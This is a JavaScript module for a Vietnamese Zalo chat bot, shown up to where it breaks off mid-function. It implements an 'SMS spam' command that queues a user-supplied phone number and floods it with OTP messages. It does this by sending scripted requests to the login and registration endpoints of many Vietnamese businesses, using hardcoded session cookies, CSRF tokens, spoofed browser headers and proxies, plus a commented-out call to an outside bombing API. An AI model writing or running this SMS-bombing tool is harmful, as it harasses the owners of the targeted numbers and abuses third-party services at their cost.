import axios from "axios";
import { removeMention } from "../../../utils/format-util.js";
import { getGlobalPrefix } from "../../service.js";
import { sendMessageFromSQL } from "../../chat-zalo/chat-style/chat-style.js";
import fs from "fs";
import { TEMP_DATA_FILE } from "../../../utils/io-json.js";

let requestQueue = [];
let isProcessing = false;
const DELAY_BETWEEN_REQUESTS = 900000;
let lastSpamTime = new Map();

export function loadDataSpamSmsFromFile(api) {
  const botId = api.getBotId();
  try {
    const data = JSON.parse(fs.readFileSync(TEMP_DATA_FILE, "utf8"));

    if (data.spamsms && Array.isArray(data.spamsms.queue)) {
      for (const smsSpam of data.spamsms.queue) {
        if (smsSpam.idApi && smsSpam.idApi === botId) {
          requestQueue.push({ api, ...smsSpam, resolve: () => {}, reject: () => {} });
        }
      }
    }

    if (data.spamsms && data.spamsms.lastSpamTime) {
      lastSpamTime = new Map(Object.entries(data.spamsms.lastSpamTime));
    }

    console.log(
      `[SPAM SMS] Đã tải ${requestQueue.length} số điện thoại trong hàng đợi và ${lastSpamTime.size} bản ghi thời gian.`
    );
  } catch (error) {
    console.error("Lỗi khi đọc dữ liệu từ temp-data.json:", error);
  }
}

function saveDataToFile() {
  try {
    const data = JSON.parse(fs.readFileSync(TEMP_DATA_FILE, "utf8"));
    const queueToSave = requestQueue.map(({ api, message, phoneNumber }) => ({
      idApi: api.getBotId(),
      phoneNumber,
      message,
      addedTime: Date.now(),
    }));

    const lastSpamTimeObj = Object.fromEntries(lastSpamTime);

    data.spamsms = {
      queue: queueToSave,
      lastSpamTime: lastSpamTimeObj,
    };

    fs.writeFileSync(TEMP_DATA_FILE, JSON.stringify(data, null, 2), "utf8");
  } catch (error) {
    console.error("Lỗi khi lưu dữ liệu vào temp-data.json:", error);
  }
}

async function processQueue() {
  if (isProcessing || requestQueue.length === 0) return;

  isProcessing = true;

  while (requestQueue.length > 0) {
    const { api, message, phoneNumber, resolve, reject } = requestQueue.shift();

    saveDataToFile();

    try {
      await spamSmsOTP(api, message, phoneNumber);
      if (typeof resolve === "function") resolve();
    } catch (error) {
      if (typeof reject === "function") reject(error);
    }

    await new Promise((resolve) => setTimeout(resolve, DELAY_BETWEEN_REQUESTS));
  }

  isProcessing = false;
  saveDataToFile();
}

async function spamSmsOTP(api, message, phoneNumber) {
  try {
    // const response = await axios.get(
    //   `http://160.250.133.170:3000/deepkill/api?key=fCPRqRFLU79NS2f22&phone=${phoneNumber}`
    // );

    // lastSpamTime.set(phoneNumber, Date.now());
    // saveDataToFile();

    // if (response.data.error_phone) {
    //   if (api && message) {
    //     const result = {
    //       success: false,
    //       message: `Số ${phoneNumber} không hợp lệ và đã bị xóa khỏi hàng chờ!!!.`,
    //     };
    //     await sendMessageFromSQL(api, message, result, true, 300000);
    //   }
    // } else {
    //   if (api && message) {
    //     const result = {
    //       success: true,
    //       message: `Đã thực hiện spam sms đến số điện thoại ${phoneNumber}!`,
    //     };
    //     await sendMessageFromSQL(api, message, result, true, 300000);
    //   }
    // }

    await spamSmsOTPByNDQ(api, message, phoneNumber);
  } catch (error) {
    if (api && message) {
      const result = {
        success: false,
        message: `Số điện thoại điền vào không hợp lệ hoặc truy vấn sms thất bại!!!, số ${phoneNumber} đã bị xóa khỏi hàng chờ.`,
      };
      await sendMessageFromSQL(api, message, result, true, 300000);
    }
  }
}

function isValidPhoneNumber(phoneNumber) {
  const regex = /^(?:\+84|0)\d{9}$/;
  if (!regex.test(phoneNumber))
    return {
      valid: false,
      reason: "",
    };
  if (/(\d)\1{6}/.test(phoneNumber.replace(/^\+84/, "0")))
    return {
      valid: false,
      reason: "Số này mà spam, spam cái mả mẹ mày à?",
    };
  return {
    valid: true,
    reason: "",
  };
}

function addToQueue(api, message, phoneNumber) {
  return new Promise((resolve, reject) => {
    requestQueue.push({ api, message, phoneNumber, resolve, reject });
    saveDataToFile();
    processQueue();
  });
}

function getQueueInfo() {
  if (requestQueue.length === 0) {
    return null;
  }

  const queueInfo = requestQueue.map((request, index) => {
    const position = index + 1;
    const estimatedTime = position * (DELAY_BETWEEN_REQUESTS / 60000);
    return {
      phoneNumber: request.phoneNumber,
      position: position,
      estimatedMinutes: estimatedTime,
    };
  });

  return queueInfo;
}

function isPhoneNumberInQueue(phoneNumber) {
  return requestQueue.some((request) => request.phoneNumber === phoneNumber);
}

function getPhoneNumberQueuePosition(phoneNumber) {
  const index = requestQueue.findIndex((request) => request.phoneNumber === phoneNumber);
  if (index === -1) return null;

  const position = index + 1;
  const estimatedTime = position * (DELAY_BETWEEN_REQUESTS / 60000);
  return {
    position,
    estimatedMinutes: estimatedTime,
  };
}

export async function handleSpamSMSCommand(api, message, aliasCommand) {
  const content = removeMention(message);
  const prefix = getGlobalPrefix(api.getBotId());
  const args = content.replace(`${prefix}${aliasCommand}`, "").trim();

  if (args.toLowerCase() === "list") {
    const queueInfo = getQueueInfo();
    if (!queueInfo) {
      const result = {
        success: true,
        message: "Hiện tại không có số điện thoại nào trong hàng chờ spam.",
      };
      await sendMessageFromSQL(api, message, result, false, 60000);
      return;
    }

    const queueList = queueInfo
      .map(
        (info) =>
          `- Số ${info.phoneNumber}:\n` +
          `  + Vị trí: ${info.position}\n` +
          `  + Thời gian chờ: ${info.estimatedMinutes} phút`
      )
      .join("\n\n");

    const result = {
      success: true,
      message:
        `📋 Danh sách hàng chờ spam SMS:\n\n${queueList}\n\n` +
        `Tổng số trong hàng chờ: ${queueInfo.length}\n` +
        `Thời gian chờ tối đa: ${queueInfo.length * (DELAY_BETWEEN_REQUESTS / 60000)} phút`,
    };
    await sendMessageFromSQL(api, message, result, false, 300000);
    return;
  }

  const numberPhone = args;

  if (!numberPhone) {
    const result = {
      success: false,
      message:
        "Vui lòng nhập số điện thoại cần spam sms!\n" +
        `Cú pháp: ${prefix}${aliasCommand} (10 chữ số điện thoại)\n` +
        `Ví dụ: ${prefix}${aliasCommand} 0312345678\n` +
        `Xem hàng chờ: ${prefix}${aliasCommand} list`,
    };
    await sendMessageFromSQL(api, message, result, false, 60000);
    return;
  }

  const checkValidPhoneNumber = isValidPhoneNumber(numberPhone);
  if (!checkValidPhoneNumber.valid) {
    const result = {
      success: false,
      message: checkValidPhoneNumber.reason
        ? checkValidPhoneNumber.reason
        : `Định dạng số điện thoại không hợp lệ!\n` +
          `Cú pháp: ${prefix}${aliasCommand} (10 chữ số điện thoại)\n` +
          `Ví dụ: ${prefix}${aliasCommand} 0912345678`,
    };
    await sendMessageFromSQL(api, message, result, true, 60000);
    return;
  }

  if (isPhoneNumberInQueue(numberPhone)) {
    const queueInfo = getPhoneNumberQueuePosition(numberPhone);
    const result = {
      success: false,
      message:
        `Số ${numberPhone} đã có trong hàng chờ!\n` +
        `Vị trí hiện tại: ${queueInfo.position}\n` +
        `Thời gian chờ còn lại: ${queueInfo.estimatedMinutes} phút`,
    };
    await sendMessageFromSQL(api, message, result, true, 300000);
    return;
  }

  const lastTime = lastSpamTime.get(numberPhone);
  if (lastTime && Date.now() - lastTime < DELAY_BETWEEN_REQUESTS) {
    const remainingTime = Math.ceil((DELAY_BETWEEN_REQUESTS - (Date.now() - lastTime)) / 1000);
    const result = {
      success: false,
      message: `Vui lòng đợi ${remainingTime} giây nữa trước khi spam lại số này.`,
    };
    await sendMessageFromSQL(api, message, result, true, 300000);
    return;
  }

  const queuePosition = requestQueue.length + (isProcessing ? 1 : 0);
  if (queuePosition > 0) {
    const result = {
      success: true,
      message: `Đã thêm số ${numberPhone} vào hàng đợi.\nVị trí trong hàng đợi: ${queuePosition}\nThời gian chờ ước tính: ${
        queuePosition * (DELAY_BETWEEN_REQUESTS / 60000)
      } phút`,
    };
    await sendMessageFromSQL(api, message, result, true, queuePosition * 5 * 60000);
  }

  try {
    await addToQueue(api, message, numberPhone);
  } catch (error) {
    console.error("Lỗi khi xử lý spam SMS:", error);
  }
}

//=============================== Custom Spam SMS ===============================//
function convertCookiesToString(cookies) {
  return Object.entries(cookies)
    .map(([key, value]) => `${key}=${value}`)
    .join("; ");
}

async function tv360(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "content-type": "application/json",
    origin: "https://tv360.vn",
    priority: "u=1, i",
    referer:
      "https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2Ftv%2F2%3Fch%3D2%26ev%3D39292%26es%3D1%26col%3Dbanner%26sect%3DBANNER%26page%3Dhome",
    "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    starttime: Date.now(),
    tz: "Asia/Bangkok",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    cookie:
      "G_ENABLED_IDPS=google; img-ext=avif; _gid=GA1.2.2040208781.1728644519; _ga=GA1.1.844866469.1723301530; NEXT_LOCALE=vi; device-id=s%3Aweb_f8006704-6d92-4bc2-a9ba-5276b55eb612.W%2Fx5yHSiBpnBhVDbse%2FUYMkwhnXPEH74Hh0OCR5juO0; shared-device-id=web_f8006704-6d92-4bc2-a9ba-5276b55eb612; screen-size=s%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo; session-id=s%3A500a1d86-2f6a-451d-ba1f-18bd1c61ff03.iu1%2F8Mh%2BH8DrHONH%2BjlK5shOK6S89E4VLTnqPX%2FGK8U; _ga_E5YP28Y8EF=GS1.1.1728644519.2.1.1728644596.0.0.0; _ga_D7L53J0JMS=GS1.1.1728644519.2.1.1728644596.48.0.0",
  };

  const jsonData = {
    msisdn: phone,
  };

  try {
    const response = await axiosWithProxy("https://tv360.vn/public/v1/auth/get-otp-login", {
      method: "POST",
      headers,
      data: jsonData,
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function thepizzacompany(phone) {
  const headers = {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    Connection: "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    Cookie:
      "_gcl_au=1.1.637043979.1723269122; _gid=GA1.2.850945508.1723269122; _fbp=fb.1.1723269122014.876709375172032518; _tt_enable_cookie=1; _ttp=yvdUSZW1FhGPp0WInV0wJe1rO_Y; .Nop.Antiforgery=CfDJ8BZF5ThCV2VIt0xp0xKrEonwqLIuIQI_vn0gC9Sn3pdcitBfmsEFfvVneZ4ZxEII9c6W2NHFcuV-Hzr1Hc_Ixh50sQY_77vIAQYb7gT9-f3ll607cqpRi8IojzoRmky3horKgGq5xtP5euU3w-DRGrM; .Nop.Customer=a60cd9da-719f-46d7-91c5-21ef65a7e00d; .Nop.TempData=CfDJ8BZF5ThCV2VIt0xp0xKrEonGO6ayneR0pptEu7v54FWPlpzKNwVkhNmisk1VgA1Z5_V32nzewVpvWDbTCAvYPWCU_8sXaUC0_5XpgtQKR6dSicFU6CPqT8_DJ5ajBL_c1hW9t9t1ZmYEBbM9nHeAVpfSWNkRecguE9H-4YfxdcIvixnWj95kO9gzAJ20jkIqwQ; _ga=GA1.2.109960598.1723269122; _ga_ZN2XYBNP5S=GS1.1.1723269121.1.1.1723269224.25.0.0",
    Origin: "https://thepizzacompany.vn",
    Referer: "https://thepizzacompany.vn/Otp",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  };

  const jsonData = {
    phone: phone,
    __RequestVerificationToken:
      "CfDJ8BZF5ThCV2VIt0xp0xKrEolDNxiBPSE48b7TNxaa7HVeKioGsNOfJcuFiktW2svL_082dkVyABrhETaYZwSD8C_xRpaat8qQ_1393ZNof83VH1c_Icp87RecpfkBEiHOcFWsMOJsR2P5fCBuxIEP3xI",
  };

  try {
    const response = await axiosWithProxy("https://thepizzacompany.vn/customer/ResendOtp", {
      method: "POST",
      headers,
      data: jsonData,
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function medigoapp(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "content-type": "application/json",
    origin: "https://www.medigoapp.com",
    priority: "u=1, i",
    referer: "https://www.medigoapp.com/",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phone: phone,
  };

  try {
    const response = await axiosWithProxy("https://auth.medigoapp.com/prod/getOtp", {
      method: "POST",
      headers,
      data: jsonData,
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function fptshop(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "content-type": "application/json; charset=UTF-8",
    origin: "https://fptshop.com.vn",
    priority: "u=1, i",
    referer: "https://fptshop.com.vn/",
    "sec-ch-ua": 'Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    apptenantid: "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phoneNumber: phone,
    fromSys: "WEBKHICT",
    otpType: "0",
  };

  try {
    const response = await axiosWithProxy("https://papi.fptshop.com.vn/gw/is/user/new-send-verification", {
      method: "POST",
      headers,
      data: jsonData,
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function vinpearl(phone) {
  const url = "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp";

  const headers = {
    accept: "application/json",
    "accept-language": "vi-VN",
    "access-control-allow-headers":
      "Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers",
    authorization: "Bearer undefined",
    "content-type": "application/json",
    origin: "https://booking.vinpearl.com",
    priority: "u=1, i",
    referer: "https://booking.vinpearl.com/",
    "sec-ch-ua": `"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-display-currency": "VND",
  };

  const body = JSON.stringify({
    channel: "vpt",
    username: phone,
    type: 1,
    OtpChannel: 1,
  });

  try {
    const response = await axios.post(url, body, { headers });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function liena(phone) {
  const headers = {
    accept: "*/*",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "content-type": "application/json",
    cookie:
      "_gcl_au=1.1.584278375.1738803664; form_key=yRKNc5na5ZX8uz4F; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; _gid=GA1.3.1607133511.1738803664; _gat=1; _fbp=fb.2.1738803664442.840691016393897167; PHPSESSID=6d1173bb738566a605e2875003dfca46; _ga_EG96D1Q288=GS1.1.1738803663.1.1.1738803684.39.0.0; _ga=GA1.3.2082610988.1738803663; form_key=yRKNc5na5ZX8uz4F; section_data_ids={}",
    origin: "https://www.liena.com.vn",
    priority: "u=1, i",
    referer: "https://www.liena.com.vn/la-customer/register",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const json_data = JSON.stringify({
    phone_number: phone,
  });

  try {
    const response = await axios.post(
      "https://www.liena.com.vn/rest/V1/liena/customer/registration/request",
      json_data,
      {
        headers: headers,
      }
    );
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function viettelpost(phone) {
  const headers = {
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    Cookie:
      "_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0",
    Origin: "null",
    Pragma: "no-cache",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  };

  const json_data = {
    "FormRegister.FullName": "Taylor Jasmine",
    "FormRegister.Phone": phone,
    "FormRegister.Password": "vjyy1234",
    "FormRegister.ConfirmPassword": "vjyy1234",
    ReturnUrl:
      "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs",
    ConfirmOtpType: "Register",
    "FormRegister.IsRegisterFromPhone": "true",
    __RequestVerificationToken:
      "CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ",
  };

  try {
    const response = await axios.post("https://id.viettelpost.vn/Account/SendOTPByPhone", json_data, {
      headers: headers,
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

async function vuihoc(phone) {
  const headers = {
    accept: "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    cookie:
      'VERSION=1; WEB_LOP=1; duo_theme_json={"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/anh-bia-khoa-hoc.png","holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/cdn-tet-animation.js","start_time":"2024-01-29 00:00:00","end_time":"2024-02-17 00:00:00"}; _gid=GA1.2.121155666.1723109800; _gat_UA-133956209-1=1; _gat_gtag_UA_133956209_1=1; _ga_PR7QKZ61KC=GS1.1.1723109800.1.1.1723109955.42.0.0; _ga=GA1.1.1744769498.1723109800; _ga_4BW81DWTX0=GS1.1.1723109800.1.1.1723109955.43.0.0',
    origin: "https://vuihoc.vn",
    priority: "u=1, i",
    referer: "https://vuihoc.vn/user/verifyAccountkitSMS?phone=+84856738291&typeOTP=1",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const json_data = {
    mobile: phone,
  };

  try {
    const response = await axios.post("https://vuihoc.vn/service/security/sendOTPSMS", json_data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function acheckin(phone) {
  const headers = {
    accept: "*/*",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "access-control-allow-origin": "*",
    authorization: "undefined",
    "content-type": "application/json",
    locale: "vi-VN",
    origin: "https://hrm.acheckin.io",
    priority: "u=1, i",
    referer: "https://hrm.acheckin.io/",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-workspace-host": "hrm.acheckin.io",
  };

  const json_data = {
    search: phone,
  };

  try {
    const response = await axios.get("https://api-gateway.acheckin.io/v1/external/auth/check-existed-account", {
      params: json_data,
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function pnj(phone) {
  const headers = {
    accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    cookie:
      "_atm_objs=eyJzb3VyY2UiOiIiLCJtZWRpdW0iOiIiLCJjYW1wYWlnbiI6IiIsImNvbnRlbnQiOiIiLCJ0ZXJt%0D%0AIjoiIiwidHlwZSI6IiIsImNoZWNrc3VtIjoiKiJ9; _pk_ses.564990245.4a15=*; _cdp_fsid=7959313047292636; _asm_visitor_type=n; au_id=1754586299; _asm_uid=1754586299; _ac_au_gt=1738806502687; _cdp_cfg=1; _gcl_au=1.1.822944906.1738806505; cdp_blocked_sid_35343967=1; _gid=GA1.3.971667031.1738806506; _gat_UA-26000195-1=1; _cdp_user_new; _fbp=fb.2.1738806506130.451758876936098744; _clck=4lvlf1%7C2%7Cft7%7C0%7C1863; _tt_enable_cookie=1; _ttp=cEkWqK_6r8boZUXKxSH0_vAjYvI.tt.2; _utm_objs=; _dc_gtm_UA-26000195-1=1; XSRF-TOKEN=eyJpdiI6Im9aL2ZrbW95MDI3Q0ZjNjVLdERaRlE9PSIsInZhbHVlIjoiT1lyU1RBZUdEQmMyV2hyWnE0YmU1aFgzMFg5ZUQwanlqL0lTOVg2WFhSZnlvTzYxQjZjZW5vU0pyOUpHSDNZY21HYjhLNmdZTUt1TGhqS2FybXJ4ajdSaERqVXhnV252cEphT0VrRTgvaFJPNnJaeDdacHpnWHRHTXhzcnYweVciLCJtYWMiOiI1ZjM4MzM2NGNjYWY1ODJlYzI2YWRjZDE3MzcyZDBlZTAzY2U0MTQ5ZDVkYzY5MGYyMWMxMzA1MDUyOGFjMGFjIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IitkNmZTdXRSV1NjL1NnZGlNdTZpcmc9PSIsInZhbHVlIjoidm5MaHNoQlVDS0VZcVJNdGt1aXlQcm1SWDNHajRZU2NwT3pKVkxOck1aSEIxdHZmSDdhbWU4c0RXWVBOdHNBSTJrTjFFaDRUbmxVRzlEZGJhNHYrNjEzazBWU3pTVTl1VUVZQmxUSHVCL3lueHQvR3l5LzJ1b1pOSEFmbzR0NCsiLCJtYWMiOiJmMjJkOGEzYmI4OWI4N2MwODk1MWVmN2MzZTQ2ZmVhYTYyZWJhYTMxMmE2NGY4MmEyOWNmYmYxNWFkNDI3ZDI5IiwidGFnIjoiIn0%3D; _pk_id.564990245.4a15=1754586299.1738806503.1.1738806543.1738806503.; _ga=GA1.3.1687514656.1738806506; _ac_client_id=1754586299.1738806542; _asm_ss_view=%7B%22time%22%3A1738806504146%2C%22sid%22%3A%227959313047292636%22%2C%22page_view_order%22%3A4%2C%22utime%22%3A%222025-02-06T01%3A49%3A03%22%2C%22duration%22%3A38987%7D; _ac_an_session=zkzqzmzqzgzizgzjznzkzhzqzhzlzgzlzdzizkzmznzmzrzlzhzqzqzdzizkzgzrzrzjzlzmznzhzdzizdzizkzgzrzrzjzlzmznzhzdzizkzgzrzrzjzlzmznzhzdzizdzhzqzdzizd2f27zdzgzdzlzmzlzkzjzdzd3226z82q2524z835242725z82q242h2k; _ga_3S12QVTD78=GS1.1.1738806505.1.1.1738806543.22.0.0; _ga_TN4J88TP5X=GS1.3.1738806507.1.1.1738806543.24.0.0; _clsk=nqx0qy%7C1738806543996%7C3%7C0%7Cz.clarity.ms%2Fcollect; _ga_FR6G8QLYZ1=GS1.1.1738806505.1.1.1738806565.0.0.0",
    origin: "https://www.pnj.com.vn",
    priority: "u=0, i",
    referer: "https://www.pnj.com.vn/customer/login",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const json_data = {
    _method: "POST",
    _token: "QpZ6twUlwVEnFD3Ol7hARQHKbEaIRLG6SVFQaeoV",
    type: "sms",
    phone: phone,
  };

  try {
    const response = await axios.post("https://www.pnj.com.vn/customer/otp/request", json_data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function viettelLogin(phone) {
  const headers = {
    Accept: "application/json, text/plain, */*",
    "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    Connection: "keep-alive",
    "Content-Type": "application/json;charset=UTF-8",
    Cookie:
      "laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D",
    DNT: "1",
    Origin: "https://viettel.vn",
